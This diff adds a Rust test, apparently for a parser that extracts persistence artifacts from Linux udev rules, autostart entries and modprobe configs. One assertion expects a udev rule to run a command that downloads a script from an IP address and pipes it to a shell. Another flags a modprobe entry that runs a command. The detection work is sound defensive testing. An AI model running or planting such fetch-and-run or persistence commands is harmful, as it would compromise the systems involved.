@@ -132,3 +132,27 @@ fn at_jobs_pam_and_sshd() {
         .iter()
         .all(|r| r.facets.user_name.as_deref() == Some("root")));
 }
+
+#[test]
+fn udev_autostart_and_modprobe() {
+    let udev = parse("etc/udev/rules.d/99-usb-sync.rules");
+    assert_eq!(
+        udev[0].facets.process_command_line.as_deref(),
+        Some("/bin/sh -c 'curl -s http://198.51.100.23/s | sh'")
+    );
+    assert_eq!(udev[0].fields.get("Kind"), Some(&Value::from("udev rule")));
+
+    let autostart = parse("home/alice/.config/autostart/tracker-extract.desktop");
+    assert_eq!(autostart[0].facets.user_name.as_deref(), Some("alice"));
+    assert_eq!(
+        autostart[0].fields.get("Disabled"),
+        Some(&Value::Bool(false))
+    );
+
+    let modprobe = parse("etc/modprobe.d/blacklist-local.conf");
+    assert_eq!(modprobe[2].fields.get("Module"), Some(&Value::from("ext4")));
+    assert_eq!(
+        modprobe[2].fields.get("Flags"),
+        Some(&Value::from("modprobe runs a command"))
+    );
+}
